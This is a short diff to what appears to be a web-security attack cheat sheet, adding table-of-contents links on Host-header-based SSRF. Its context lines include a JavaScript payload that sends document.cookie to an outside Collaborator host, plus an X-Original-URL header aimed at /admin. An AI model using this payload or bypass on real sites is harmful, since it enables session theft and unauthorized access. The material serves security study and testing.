@@ -706,6 +706,8 @@ document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 
 [Spoof IP Address](#spoof-ip-address)  
 [HOST Connection State](#host-connection-state)  
+[Host Routing based SSRF](#host-routing-based-ssrf)  
+[SSRF via flawed Host request parsing](#absolute-get-url--host-ssrf)  
 
 ### Spoof IP Address  
 
@@ -1821,6 +1823,7 @@ X-Original-URL: /admin
 [HOST Routing-based SSRF](#host-routing-based-ssrf)  
 [HTML to PDF](#html-to-pdf)  
 [SSRF Open Redirection](#ssrf-open-redirection)  
+[Host Header Connection State + SSRF](#host-connection-state)  
 
 >SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
   
